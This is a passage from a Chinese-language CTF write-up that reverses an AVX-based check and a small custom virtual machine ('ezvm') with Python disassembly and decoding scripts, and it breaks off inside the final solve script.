</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        to  : b&#34;3_bh&#34; b&#34;&#39;6</span><span style="color:#ae81ff">\xd6\x82\xc2</span><span style="color:#e6db74">m</span><span style="color:#ae81ff">\xe8\xaa</span><span style="color:#e6db74">&#34; b&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">d</span><span style="color:#ae81ff">\xa8\xff\x8f\x99\xa7\x94\x9e\x9a</span><span style="color:#e6db74">)4&#34; b&#34;</span><span style="color:#ae81ff">\x96</span><span style="color:#e6db74">Je</span><span style="color:#ae81ff">\xc0\x0c</span><span style="color:#e6db74">7</span><span style="color:#ae81ff">\x19\xc9</span><span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> y[:<span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> y[<span style="color:#ae81ff">12</span>:<span style="color:#ae81ff">24</span>] <span style="color:#f92672">+</span> y[<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">12</span>] <span style="color:#f92672">+</span> y[<span style="color:#ae81ff">24</span>:]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rev_vpxor</span>(x, y):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> bytes([a <span style="color:#f92672">^</span> b <span style="color:#66d9ef">for</span> a, b <span style="color:#f92672">in</span> zip(x, y)])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rev_vpaddb</span>(x, y):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> bytes([(a <span style="color:#f92672">-</span> b) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span> <span style="color:#66d9ef">for</span> a, b <span style="color:#f92672">in</span> zip(x, y)])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rev_vpsubb</span>(x, y):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> bytes([(a <span style="color:#f92672">+</span> b) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span> <span style="color:#66d9ef">for</span> a, b <span style="color:#f92672">in</span> zip(x, y)])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rev_vpshufb</span>(x, y):
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    origin:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        from: b&#39;</span><span style="color:#ae81ff">\x89\xa1</span><span style="color:#e6db74">&#39; b&#39;&gt;</span><span style="color:#ae81ff">\xc0\xe5\x14</span><span style="color:#e6db74">&#39; &#39;_</span><span style="color:#ae81ff">\xc5</span><span style="color:#e6db74">&#39; &#39;_</span><span style="color:#ae81ff">\x14\xb0</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#ae81ff">\xd0</span><span style="color:#e6db74">&#39; &#39;%</span><span style="color:#ae81ff">\x1f\xe8</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#ae81ff">\xf5\xb0</span><span style="color:#e6db74">&#39; &#39;4&#39; &#39;6</span><span style="color:#ae81ff">\xc2\xc7\xa0</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#ae81ff">\xb2</span><span style="color:#e6db74">&lt;^~</span><span style="color:#ae81ff">\x9c</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#ae81ff">\xa4\x98</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#ae81ff">\xe8</span><span style="color:#e6db74">T&#39; &#39;</span><span style="color:#ae81ff">\x0b</span><span style="color:#e6db74">&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        to  : b&#39;</span><span style="color:#ae81ff">\x89\xa1</span><span style="color:#e6db74">&#39; b&#39;_</span><span style="color:#ae81ff">\x14\xb0</span><span style="color:#e6db74">&#39; &#39;&gt;</span><span style="color:#ae81ff">\xc0\xe5\x14</span><span style="color:#e6db74">&#39; &#39;%</span><span style="color:#ae81ff">\x1f\xe8</span><span style="color:#e6db74">&#39; &#39;_</span><span style="color:#ae81ff">\xc5</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#ae81ff">\xd0</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#ae81ff">\xf5\xb0</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#ae81ff">\xb2</span><span style="color:#e6db74">&lt;^~</span><span style="color:#ae81ff">\x9c</span><span style="color:#e6db74">&#39; &#39;6</span><span style="color:#ae81ff">\xc2\xc7\xa0</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#ae81ff">\xe8</span><span style="color:#e6db74">T&#39; &#39;</span><span style="color:#ae81ff">\xa4\x98</span><span style="color:#e6db74">&#39; &#39;4&#39; &#39;</span><span style="color:#ae81ff">\x0b</span><span style="color:#e6db74">&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> x[:<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> x[<span style="color:#ae81ff">5</span>:<span style="color:#ae81ff">9</span>] <span style="color:#f92672">+</span> x[<span style="color:#ae81ff">12</span>:<span style="color:#ae81ff">14</span>] <span style="color:#f92672">+</span> x[<span style="color:#ae81ff">2</span>:<span style="color:#ae81ff">5</span>] <span style="color:#f92672">+</span> x[<span style="color:#ae81ff">14</span>:<span style="color:#ae81ff">15</span>] <span style="color:#f92672">+</span> x[<span style="color:#ae81ff">9</span>:<span style="color:#ae81ff">12</span>] <span style="color:#f92672">+</span> x[<span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">17</span>]<span style="color:#f92672">+</span> x[<span style="color:#ae81ff">30</span>:<span style="color:#ae81ff">31</span>] <span style="color:#f92672">+</span> x[<span style="color:#ae81ff">22</span>:<span style="color:#ae81ff">26</span>] <span style="color:#f92672">+</span> x[<span style="color:#ae81ff">17</span>:<span style="color:#ae81ff">22</span>] <span style="color:#f92672">+</span> x[<span style="color:#ae81ff">28</span>:<span style="color:#ae81ff">30</span>] <span style="color:#f92672">+</span> x[<span style="color:#ae81ff">26</span>:<span style="color:#ae81ff">28</span>] <span style="color:#f92672">+</span> x[<span style="color:#ae81ff">31</span>:]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> a <span style="color:#f92672">in</span> asm<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]:
</span></span><span style="display:flex;"><span>    b <span style="color:#f92672">=</span> a<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;,&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>split()
</span></span><span style="display:flex;"><span>    exec(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>b[<span style="color:#ae81ff">1</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74"> = rev_</span><span style="color:#e6db74">{</span>b[<span style="color:#ae81ff">0</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">(</span><span style="color:#e6db74">{</span>b[<span style="color:#ae81ff">2</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">, </span><span style="color:#e6db74">{</span>b[<span style="color:#ae81ff">3</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">)&#39;</span>)
</span></span><span style="display:flex;"><span>print (ymm0)
</span></span></code></pre></div><blockquote>
<p>ida 动调的时候要知道寄存器的值，可以用 idapython 的 <code>get_reg_value(&quot;ymm0&quot;)</code>
指令不知道什么意思的话动调看一下变化就行</p>
</blockquote>
<h3 id="reezvm">[RE]ezvm</h3>
<p>把几个指令整理一下</p>
<p>能够看出特定用途的几个寄存器：</p>
<p>[8]: ZF 相等为 0，大于为 1，小于为 -1
[9]: stack
[9 + 100]: code
[9 + 200]: data</p>
<p>其他的应该都是 rax 之类的</p>
<p>总结的几个指令：</p>
<table>
<thead>
<tr>
<th style="text-align:center">op</th>
<th style="text-align:left">disasm</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:left"><code>mov r3, r2</code></td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:left"><code>inc r2</code></td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:left"><code>dec r2</code></td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:left"><code>xor r3, r7</code></td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:left"><code>push r3</code></td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td style="text-align:left"><code>push r5</code></td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td style="text-align:left"><code>push r6</code></td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td style="text-align:left"><code>pop r3</code></td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td style="text-align:left"><code>pop r5</code></td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td style="text-align:left"><code>pop r6</code></td>
</tr>
<tr>
<td style="text-align:center">10</td>
<td style="text-align:left"><code>pop r2</code></td>
</tr>
<tr>
<td style="text-align:center">11</td>
<td style="text-align:left"><code>pop r7</code></td>
</tr>
<tr>
<td style="text-align:center">12</td>
<td style="text-align:left"><code>jz $+1+r6</code></td>
</tr>
<tr>
<td style="text-align:center">13</td>
<td style="text-align:left"><code>jnz $+1+r6</code></td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td style="text-align:left"><code>jmp $+1+r2</code></td>
</tr>
<tr>
<td style="text-align:center">15</td>
<td style="text-align:left"><code>cmp r3, r5</code></td>
</tr>
<tr>
<td style="text-align:center">16</td>
<td style="text-align:left"><code>getchar(r3)</code></td>
</tr>
<tr>
<td style="text-align:center">17</td>
<td style="text-align:left"><code>putchar(r3)</code></td>
</tr>
<tr>
<td style="text-align:center">18</td>
<td style="text-align:left"><code>push *((r4++)+0xD1)</code></td>
</tr>
<tr>
<td style="text-align:center">19</td>
<td style="text-align:left"><code>mov r3, [rbp+r2]</code></td>
</tr>
<tr>
<td style="text-align:center">20</td>
<td style="text-align:left"><code>mov [rbp+r2], r3</code></td>
</tr>
<tr>
<td style="text-align:center">21</td>
<td style="text-align:left"><code>add r3, r3</code></td>
</tr>
</tbody>
</table>
<p>接下来就是反汇编了</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>code <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x0F</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x0D</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0x0F</span>, <span style="color:#ae81ff">0x0D</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x0A</span>, <span style="color:#ae81ff">0x13</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x0B</span>, <span style="color:#ae81ff">0x15</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0x14</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x0F</span>, <span style="color:#ae81ff">0x0D</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x0A</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">0x13</span>, <span style="color:#ae81ff">0x0F</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">9</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x0D</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x0F</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x0D</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x0A</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0x0F</span>, <span style="color:#ae81ff">0x0C</span>, <span style="color:#ae81ff">0x11</span>, <span style="color:#ae81ff">0x0E</span>
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">disasm</span>(i, c):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;mov [3], [2]&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;inc [2]&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>:
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;dec [2]&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>:
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;xor [3], [7]&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span>:
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;push [3]&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">5</span>:
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;push [5]&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">6</span>:
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;push [6]&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">7</span>:
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;pop [3]&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">8</span>:
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;pop [5]&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">9</span>:
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;pop [6]&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">10</span>:
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;pop [2]&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">11</span>:
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;pop [7]&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">12</span>:
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;jz $+1+[6]&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">13</span>:
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;jnz $+1+[6]&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">14</span>:
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;jmp $+1+[2]&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">15</span>:
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;cmp [3], [5]&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">16</span>:
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;getchar([3])&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">17</span>:
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;putchar([3])&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">18</span>:
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;push *(([4]++)+0xD1)&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">19</span>:
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;mov [3], [rbp+[2]]&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">20</span>:
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;mov [rbp+[2]], [3]&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#ae81ff">21</span>:
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;add [3], [3]&#34;</span>)
</span></span></code></pre></div><p>也许跟着 log 一起看比较好，这里就直接对着 data 里的数据看了</p>
<pre tabindex="0"><code>_00:    push 0x0A
_01:    pop [5]
_02:    push -5
_03:    pop [6]

_04:    getchar([3])
_05:    push [3]
_06:    inc [2]
_07:    cmp [3], [5]
_08:    jnz $+1+[6]
_09:    dec [2]
</code></pre><p>这个 jnz 的循环是 <code>getchar()</code> 直到读取到 <code>\n</code></p>
<p>接下来是个对长度做了限制</p>
<pre tabindex="0"><code>_0A:    push 0x20
_0B:    pop [5]
_0C:    push 0x2F
_0D:    pop [6]
_0E:    mov [3], [2]
_0F:    push [3]
_10:    cmp [3], [5]
_11:    jnz $+1+[6]
</code></pre><p>这里先 add 自身，然后依次异或 data 中的数据（第一个是 0x5e）</p>
<pre tabindex="0"><code>_12:    push -10
_13:    pop [6]
_14:    push 0
_15:    pop [2]
_16:    mov [3], [rbp+[2]]
_17:    push 0x5e (next_mem)
_18:    pop [7]
_19:    add [3], [3]
_1A:    xor [3], [7]
_1B:    mov [rbp+[2]], [3]
_1C:    inc [2]
_1D:    mov [3], [2]
_1E:    cmp [3], [5]
_1F:    jnz $+1+[6]
</code></pre><p>后面就是比较了，如果不相等就会直接从第一个 jnz 直接退出，否则会判断长度来看是否退出循环</p>
<pre tabindex="0"><code>_20:    push *(([4]++)+0xD1) ; 0
_21:    pop [2]
_22:    push *(([4]++)+0xD1) ; -17
_23:    push *(([4]++)+0xD1) ; 21

_24:    push *(([4]++)+0xD1) ; 142
_25:    pop [5] ; [5] = 142
_26:    mov [3], [rbp+[2]] ; [3]=142
_27:    cmp [3], [5] ; 0
_28:    pop [3]
_29:    push [3]
_2A:    pop [6] ; 21
_2B:    jnz $+1+[6]

_2C:    pop [6] ; -17
_2D:    pop [5]
_2E:    push [5]
_2F:    push [6]
_30:    push [3]
_31:    inc [2]
_32:    mov [3], [2]
_33:    cmp [3], [5]
_34:    jnz $+1+[6]
</code></pre><p>最后一段没有看了，<code>putchar()</code> 显然是输出正确信息</p>
<p>脚本</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> operator <span style="color:#f92672">import</span> xor
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>xor_list <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x5E</span>, <span style="color:#ae81ff">0x46</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x0E</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x1F</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x5E</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x37</span>, <span style="color:#ae81ff">0x29</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0x3B</span>, <span style="color:#ae81ff">0x64</span>, <span style="color:#ae81ff">0x3B</span>, <span style="color:#ae81ff">0x15</span>, <span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0x5B</span>, <span style="color:#ae81ff">0x3E</span>, <span style="color:#ae81ff">0x22</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x46</span>, <span style="color:#ae81ff">0x5E</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x4E</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x23</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">0x3B</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cipher <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x8E</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x0A3</span>, <span style="color:#ae81ff">0x99</span>, <span style="color:#ae81ff">0x0C4</span>, <span style="color:#ae81ff">0x0A5</span>, <span style="color:#ae81ff">0x0C3</span>, <span style="color:#ae81ff">0x0DD</span>, <span style="color:#ae81ff">0x19</span>, <span style="color:#ae81ff">0x0EC</span>, <span style="color:#ae81ff">0x6C</span>, <span style="color:#ae81ff">0x9B</span>, <span style="color:#ae81ff">0x0F3</span>, <span style="color:#ae81ff">0x1B</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x5B</span>, <span style="color:#ae81ff">0x3E</span>, <span style="color:#ae81ff">0x9B</span>, <span style="color:#ae81ff">0x0F1</span>, <span style="color:#ae81ff">0x86</span>, <span style="color:#ae81ff">0x0F3</span>, <span style="color:#ae81ff">0x0F4</span>, <span style="color:#ae81ff">0x0A4</span>, <span style="color:#ae81ff">0x0F8</span>, <span style="color:#ae81ff">0x0F8</span>, <span style="color:#ae81ff">0x98</span>, <span style="color:#ae81ff">0x0AB</span>, <span style="color:#ae81ff">0x86</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x22</span>, <span 